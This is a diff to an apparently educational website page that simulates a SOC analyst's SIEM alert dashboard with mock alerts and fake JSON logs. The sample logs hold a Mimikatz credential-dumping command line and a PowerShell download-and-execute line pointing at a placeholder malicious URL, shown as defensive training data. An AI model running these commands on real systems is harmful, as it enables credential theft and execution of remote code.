@@ -18,60 +18,75 @@ permalink: /alerts/
                 <div class="number">5</div>
             </div>
             <div class="stat-card info-glow">
-                <h3>OPEN</h3>
+                <h3>OPEN CASES</h3>
                 <div class="number">7</div>
+            </div>
+            <div class="stat-card success-glow">
+                <h3>MTTR</h3>
+                <div class="number">8m</div>
             </div>
         </div>
 
         <div class="alerts-table-wrapper">
             <div class="table-header">
-                <span class="blink">●</span> LIVE THREAT FEED // SPLUNK_ES_DEMO
+                <div class="header-left">
+                    <span class="blink">●</span> LIVE FEED // SENTINEL_GUARD_SIEM
+                </div>
+                <div class="header-right">
+                    Queue: <span style="color: #fff">Tier 1 Analysis</span>
+                </div>
             </div>
             <table class="soar-table">
                 <thead>
                     <tr>
                         <th>ID</th>
+                        <th>TIMESTAMP</th>
                         <th>RULE NAME</th>
+                        <th>ASSET</th>
                         <th>SEVERITY</th>
-                        <th>STATUS</th>
                         <th>ACTION</th>
                     </tr>
                 </thead>
                 <tbody>
-                    <tr id="alert-101">
-                        <td class="mono">#101</td>
-                        <td>Mimikatz.exe Exec</td>
+                    <tr>
+                        <td class="mono">#SOC-101</td>
+                        <td class="mono">10:42:15 UTC</td>
+                        <td>Credential Dumping (Mimikatz)</td>
+                        <td class="mono">FINANCE-SRV-01</td>
                         <td><span class="badge critical">CRITICAL</span></td>
-                        <td><span class="status new">NEW</span></td>
-                        <td><button class="btn-investigate" onclick="investigate('alert-101')">ANALYZE</button></td>
+                        <td><button class="btn-investigate" onclick="openModal('101')">VIEW LOGS</button></td>
                     </tr>
-                    <tr id="alert-102">
-                        <td class="mono">#102</td>
-                        <td>Brute Force (RDP)</td>
+                    <tr>
+                        <td class="mono">#SOC-102</td>
+                        <td class="mono">10:38:00 UTC</td>
+                        <td>Brute Force Detection (RDP)</td>
+                        <td class="mono">HR-WORKSTATION-04</td>
                         <td><span class="badge high">HIGH</span></td>
-                        <td><span class="status new">NEW</span></td>
-                        <td><button class="btn-investigate" onclick="investigate('alert-102')">ANALYZE</button></td>
+                        <td><button class="btn-investigate" onclick="openModal('102')">VIEW LOGS</button></td>
                     </tr>
-                    <tr id="alert-103">
-                        <td class="mono">#103</td>
-                        <td>Suspicious PowerShell</td>
+                    <tr>
+                        <td class="mono">#SOC-103</td>
+                        <td class="mono">09:15:22 UTC</td>
+                        <td>Suspicious PowerShell Execution</td>
+                        <td class="mono">DEV-LAPTOP-02</td>
                         <td><span class="badge medium">MEDIUM</span></td>
-                        <td><span class="status progress">IN PROG</span></td>
-                        <td><button class="btn-investigate" disabled>ASSIGNED</button></td>
+                        <td><button class="btn-investigate" onclick="openModal('103')">VIEW LOGS</button></td>
                     </tr>
-                     <tr id="alert-104">
-                        <td class="mono">#104</td>
-                        <td>User Added to Admin</td>
+                     <tr>
+                        <td class="mono">#SOC-104</td>
+                        <td class="mono">08:50:11 UTC</td>
+                        <td>User Added to Domain Admins</td>
+                        <td class="mono">DC-01</td>
                         <td><span class="badge critical">CRITICAL</span></td>
-                        <td><span class="status closed">CLOSED</span></td>
-                        <td><button class="btn-investigate" disabled>RESOLVED</button></td>
+                        <td><button class="btn-investigate" disabled style="opacity:0.5">RESOLVED</button></td>
                     </tr>
-                     <tr id="alert-105">
-                        <td class="mono">#105</td>
-                        <td>Internal Port Scan</td>
+                     <tr>
+                        <td class="mono">#SOC-105</td>
+                        <td class="mono">08:30:05 UTC</td>
+                        <td>Internal Port Scan (Recon)</td>
+                        <td class="mono">GUEST-WIFI-CLIENT</td>
                         <td><span class="badge low">LOW</span></td>
-                        <td><span class="status closed">CLOSED</span></td>
-                        <td><button class="btn-investigate" disabled>FALSE POS</button></td>
+                        <td><button class="btn-investigate" disabled style="opacity:0.5">FALSE POS</button></td>
                     </tr>
                 </tbody>
             </table>
@@ -82,66 +97,145 @@ permalink: /alerts/
         <div class="info-box">
             <div class="info-header">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
-                SİMÜLASYON MODU
+                SIMULATION MODE
             </div>
             <p>
-                Bu ekran, gerçek bir <strong>SOAR (Güvenlik Orkestrasyonu ve Müdahalesi)</strong> ürününün arayüzünü simüle etmek amacıyla, tamamen <strong>eğitim ve bilgilendirme</strong> amaçlı tasarlanmıştır.
+                This interface simulates a real-world **SOAR (Security Orchestration, Automation, and Response)** dashboard used by Tier-1 SOC Analysts.
             </p>
             <hr>
             <p>
-                Burada gördüğünüz alarmlar ve veriler örnektir. Amacım, ziyaretçilere bir SOC analistinin günlük hayatta kullandığı operasyonel panellerin (Splunk, QRadar, Sentinel vb.) nasıl göründüğünü ve işlediğini göstermektir.
+                <strong>How to use:</strong> Click on the <span style="color:var(--accent)">VIEW LOGS</span> button to inspect the raw telemetry and event details generated by our mock SIEM engine.
             </p>
             <div class="system-meta">
-                <span>SYSTEM:</span> DEMO_ENV<br>
-                <span>VERSION:</span> v2.4.0<br>
-                <span>ACCESS:</span> READ_ONLY
+                <span>ENGINE:</span> SENTINEL_GUARD v4.2<br>
+                <span>LATENCY:</span> 24ms<br>
+                <span>ROLE:</span> ANALYST_VIEW
             </div>
         </div>
     </div>
 
 </div>
 
+<div id="logModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h2 id="modalTitle">CASE DETAILS</h2>
+            <span class="close" onclick="closeModal()">&times;</span>
+        </div>
+        <div class="modal-body">
+            <div class="log-metadata">
+                <div><strong>Source:</strong> <span id="logSource"></span></div>
+                <div><strong>Destination:</strong> <span id="logDest"></span></div>
+                <div><strong>Event ID:</strong> <span id="logEventId"></span></div>
+            </div>
+            <div class="code-block-wrapper">
+                <div class="code-label">RAW LOG PREVIEW (JSON)</div>
+                <pre id="logContent" class="raw-log"></pre>
+            </div>
+            <div class="modal-actions">
+                <button class="btn-action primary" onclick="simAction('Escalate')">ESCALATE TO TIER 2</button>
+                <button class="btn-action secondary" onclick="simAction('Close')">CLOSE AS FALSE POSITIVE</button>
+            </div>
+        </div>
+    </div>
+</div>
+
 <script>
-    function investigate(rowId) {
-        let row = document.getElementById(rowId);
-        let statusSpan = row.querySelector('.status');
-        let btn = row.querySelector('.btn-investigate');
-        
-        statusSpan.className = 'status progress';
-        statusSpan.innerText = 'IN PROGRESS';
-        
-        btn.innerText = 'LOADING...';
-        btn.disabled = true;
-        
-        row.style.backgroundColor = "rgba(88, 166, 255, 0.1)";
-        
-        setTimeout(() => {
-            alert("Vaka #" + rowId + " incelemeye alındı.\nOperatör: Emirhan G.");
-            btn.innerText = 'ASSIGNED';
-        }, 500);
+    // --- MOCK DATA (Fake Logs) ---
+    const alertData = {
+        '101': {
+            title: "CASE #101: Credential Dumping",
+            source: "192.168.1.105 (FINANCE-SRV-01)",
+            dest: "Local System (LSASS.exe)",
+            eventId: "4688",
+            log: JSON.stringify({
+                "timestamp": "2025-12-19T10:42:15.000Z",
+                "event_code": 10,
+                "process_name": "C:\\Windows\\Temp\\mimikatz.exe",
+                "command_line": "\"mimikatz.exe\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+                "parent_process": "powershell.exe",
+                "user": "NT AUTHORITY\\SYSTEM",
+                "hash_sha256": "a24b...f92a (Malicious)",
+                "alert_score": 100
+            }, null, 4)
+        },
+        '102': {
+            title: "CASE #102: RDP Brute Force",
+            source: "45.12.88.99 (External)",
+            dest: "192.168.1.20 (HR-WORKSTATION)",
+            eventId: "4625",
+            log: JSON.stringify({
+                "timestamp": "2025-12-19T10:38:00.000Z",
+                "action": "failure",
+                "failure_reason": "Unknown user name or bad password",
+                "src_ip": "45.12.88.99",
+                "dst_port": 3389,
+                "logon_type": 10,
+                "attempt_count": 45,
+                "target_account": "Administrator"
+            }, null, 4)
+        },
+        '103': {
+            title: "CASE #103: Suspicious PowerShell",
+            source: "192.168.1.55 (DEV-LAPTOP)",
+            dest: "External (Pastebin)",
+            eventId: "4104",
+            log: JSON.stringify({
+                "timestamp": "2025-12-19T09:15:22.000Z",
+                "script_block": "IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/malware')",
+                "host": "DEV-LAPTOP-02",
+                "execution_policy": "Bypass",
+                "user": "corp\\jdoe",
+                "threat_level": "Medium"
+            }, null, 4)
+        }
+    };
+
+    // --- MODAL FUNCTIONS ---
+    function openModal(id) {
+        const data = alertData[id];
+        if (!data) return;
+
+        document.getElementById('modalTitle').innerText = data.title;
+        document.getElementById('logSource').innerText = data.source;
+        document.getElementById('logDest').innerText = data.dest;
+        document.getElementById('logEventId').innerText = data.eventId;
+        document.getElementById('logContent').innerText = data.log;
+
+        document.getElementById('logModal').style.display = "flex";
+    }
+
+    function closeModal() {
+        document.getElementById('logModal').style.display = "none";
+    }
+    
+    function simAction(action) {
+        alert("Simulation Action: " + action + "\nLog recorded in audit trail.");
+        closeModal();
+    }
+
+    // Close modal if clicked outside
+    window.onclick = function(event) {
+        let modal = document.getElementById('logModal');
+        if (event.target == modal) {
+            closeModal();
+        }
     }
 </script>
 
 <style>
-    /* ===== SAYFA DÜZENİ (GRID) ===== */
+    /* ===== LAYOUT & DASHBOARD ===== */
     .soar-layout {
         display: flex;
         flex-wrap: wrap;
         gap: 2rem;
         align-items: flex-start;
+        margin-bottom: 3rem;
     }
+    .main-panel { flex: 3; min-width: 300px; }
+    .side-panel { flex: 1.2; min-width: 250px; }
 
-    .main-panel {
-        flex: 3; /* Sol taraf 3 birim genişlikte */
-        min-width: 300px;
-    }
-
-    .side-panel {
-        flex: 1.2; /* Sağ taraf 1.2 birim genişlikte */
-        min-width: 250px;
-    }
-
-    /* ===== INFO BOX (SAĞ PANEL) TASARIMI ===== */
+    /* Info Sidebar */
     .info-box {
         background: rgba(22, 27, 34, 0.8);
         border: 1px solid #30363d;
@@ -150,132 +244,116 @@ permalink: /alerts/
         border-radius: 6px;
         font-size: 0.9rem;
         color: var(--text-muted);
-        position: sticky; /* Aşağı kaydırınca sabit kalsın */
-        top: 100px; 
+        position: sticky; top: 100px;
     }
-
     .info-header {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        color: #e6edf3;
-        font-weight: bold;
-        font-family: 'JetBrains Mono', monospace;
-        margin-bottom: 1rem;
-        padding-bottom: 0.5rem;
-        border-bottom: 1px dashed #30363d;
+        display: flex; align-items: center; gap: 10px; color: #e6edf3;
+        font-weight: bold; font-family: 'JetBrains Mono', monospace;
+        margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px dashed #30363d;
     }
-
-    .info-box p { margin-bottom: 1rem; line-height: 1.6; }
     .info-box hr { border: 0; border-top: 1px solid #30363d; margin: 1rem 0; }
-    
     .system-meta {
-        font-family: 'JetBrains Mono', monospace;
-        font-size: 0.75rem;
-        color: #58a6ff;
-        background: rgba(88, 166, 255, 0.1);
-        padding: 10px;
-        border-radius: 4px;
+        font-family: 'JetBrains Mono', monospace; font-size: 0.75rem;
+        color: #58a6ff; background: rgba(88, 166, 255, 0.1); padding: 10px; border-radius: 4px;
     }
 
-    /* ===== DASHBOARD TASARIMI ===== */
-    .stats-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-        gap: 1rem;
-        margin-bottom: 2rem;
-    }
-
-    .stat-card {
-        background: #161b22;
-        border: 1px solid #30363d;
-        padding: 1rem;
-        border-radius: 6px;
-        text-align: center;
-    }
-
-    .stat-card h3 { margin: 0; font-size: 0.8rem; color: #8b949e; letter-spacing: 1px; }
+    /* Stats Grid */
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; margin-bottom: 2rem; }
+    .stat-card { background: #161b22; border: 1px solid #30363d; padding: 1rem; border-radius: 6px; text-align: center; }
+    .stat-card h3 { margin: 0; font-size: 0.75rem; color: #8b949e; letter-spacing: 1px; }
     .stat-card .number { font-size: 2rem; font-weight: bold; color: #e6edf3; font-family: 'JetBrains Mono', monospace; }
-
     .danger-glow { border-bottom: 3px solid #ff5f56; }
     .warning-glow { border-bottom: 3px solid #d29922; }
     .info-glow { border-bottom: 3px solid #58a6ff; }
+    .success-glow { border-bottom: 3px solid #3fb950; }
 
-    /* Tablo Alanı */
-    .alerts-table-wrapper {
-        background: #161b22;
-        border: 1px solid #30363d;
-        border-radius: 8px;
-        overflow: hidden;
-    }
-    
+    /* Alerts Table */
+    .alerts-table-wrapper { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
     .table-header {
-        background: #0d1117;
-        padding: 10px 15px;
-        font-family: 'JetBrains Mono', monospace;
-        font-size: 0.75rem;
-        color: #3fb950;
-        border-bottom: 1px solid #30363d;
+        background: #0d1117; padding: 12px 15px; font-family: 'JetBrains Mono', monospace;
+        font-size: 0.75rem; color: #3fb950; border-bottom: 1px solid #30363d;
+        display: flex; justify-content: space-between;
     }
     .blink { animation: blinker 1.5s linear infinite; color: #ff5f56; margin-right: 5px; }
     @keyframes blinker { 50% { opacity: 0; } }
 
-    .soar-table {
-        width: 100%;
-        border-collapse: collapse;
-        font-size: 0.85rem;
-    }
-
-    .soar-table th {
-        background: #161b22;
-        color: #8b949e;
-        text-align: left;
-        padding: 12px;
-        border-bottom: 1px solid #30363d;
-        font-size: 0.75rem;
-    }
-
-    .soar-table td {
-        padding: 12px;
-        border-bottom: 1px solid #30363d;
-        color: #c9d1d9;
-    }
-    
-    .soar-table tr:hover { background-color: rgba(255,255,255,0.02); }
+    .soar-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+    .soar-table th { background: #161b22; color: #8b949e; text-align: left; padding: 12px; border-bottom: 1px solid #30363d; font-size: 0.75rem; }
+    .soar-table td { padding: 12px; border-bottom: 1px solid #30363d; color: #c9d1d9; }
+    .soar-table tr:hover { background-color: rgba(255,255,255,0.03); }
     .mono { font-family: 'JetBrains Mono', monospace; }
 
-    /* Rozetler ve Butonlar */
+    /* Badges & Buttons */
     .badge { padding: 3px 6px; border-radius: 4px; font-weight: bold; font-size: 0.65rem; }
     .critical { background: rgba(255, 95, 86, 0.15); color: #ff5f56; border: 1px solid #ff5f56; }
     .high { background: rgba(210, 153, 34, 0.15); color: #d29922; border: 1px solid #d29922; }
     .medium { background: rgba(88, 166, 255, 0.15); color: #58a6ff; border: 1px solid #58a6ff; }
     .low { background: rgba(139, 148, 158, 0.15); color: #8b949e; border: 1px solid #8b949e; }
 
-    .status { font-weight: bold; font-size: 0.7rem; }
-    .new { color: #58a6ff; }
-    .progress { color: #d29922; }
-    .closed { color: #3fb950; }
-
     .btn-investigate {
-        background: transparent;
-        border: 1px solid #30363d;
-        color: var(--accent);
-        padding: 5px 10px;
-        border-radius: 4px;
-        cursor: pointer;
-        font-family: 'JetBrains Mono', monospace;
-        font-size: 0.7rem;
+        background: transparent; border: 1px solid #30363d; color: var(--accent);
+        padding: 5px 12px; border-radius: 4px; cursor: pointer;
+        font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: bold;
         transition: all 0.2s;
     }
-    .btn-investigate:hover:not(:disabled) {
-        background: var(--accent);
-        color: #0d1117;
-    }
-    .btn-investigate:disabled { color: #484f58; border-color: transparent; }
+    .btn-investigate:hover:not(:disabled) { background: var(--accent); color: #0d1117; }
 
-    /* Mobil Uyumluluk */
+    /* ===== MODAL (POPUP) STYLES ===== */
+    .modal {
+        display: none; /* Hidden by default */
+        position: fixed; z-index: 2000; left: 0; top: 0;
+        width: 100%; height: 100%;
+        background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
+        backdrop-filter: blur(5px);
+        align-items: center; justify-content: center;
+    }
+
+    .modal-content {
+        background-color: #161b22; border: 1px solid #30363d;
+        width: 90%; max-width: 800px; border-radius: 8px;
+        box-shadow: 0 0 30px rgba(0,0,0,0.7);
+        animation: slideDown 0.3s ease-out;
+    }
+
+    .modal-header {
+        padding: 1rem 1.5rem; border-bottom: 1px solid #30363d;
+        display: flex; justify-content: space-between; align-items: center;
+        background: #0d1117; border-radius: 8px 8px 0 0;
+    }
+    .modal-header h2 { margin: 0; font-size: 1.2rem; color: var(--accent); border: none; }
+    .close { color: #8b949e; font-size: 28px; font-weight: bold; cursor: pointer; }
+    .close:hover { color: #fff; }
+
+    .modal-body { padding: 1.5rem; }
+
+    .log-metadata {
+        display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 1.5rem;
+        font-family: 'Inter', sans-serif; font-size: 0.9rem; color: #c9d1d9;
+    }
+
+    .code-block-wrapper { margin-bottom: 2rem; }
+    .code-label { font-size: 0.75rem; color: #8b949e; margin-bottom: 5px; font-family: 'JetBrains Mono', monospace; }
+    .raw-log {
+        background: #0d1117; padding: 15px; border-radius: 6px; border: 1px solid #30363d;
+        color: #3fb950; font-size: 0.85rem; overflow-x: auto;
+    }
+
+    .modal-actions { display: flex; gap: 1rem; justify-content: flex-end; }
+    .btn-action {
+        padding: 10px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; border: none; font-family: 'JetBrains Mono', monospace;
+    }
+    .primary { background: #ff5f56; color: #fff; }
+    .secondary { background: #30363d; color: #c9d1d9; border: 1px solid #8b949e; }
+    .primary:hover { background: #ff4436; }
+    .secondary:hover { border-color: #fff; }
+
+    @keyframes slideDown {
+        from { transform: translateY(-50px); opacity: 0; }
+        to { transform: translateY(0); opacity: 1; }
+    }
+
     @media (max-width: 768px) {
-        .soar-layout { flex-direction: column-reverse; } /* Telefondaysa Bilgi en altta dursun veya en üstte (normal column) */
-        .side-panel { width: 100%; }
+        .soar-layout { flex-direction: column-reverse; }
+        .log-metadata { grid-template-columns: 1fr; }
     }
 </style>
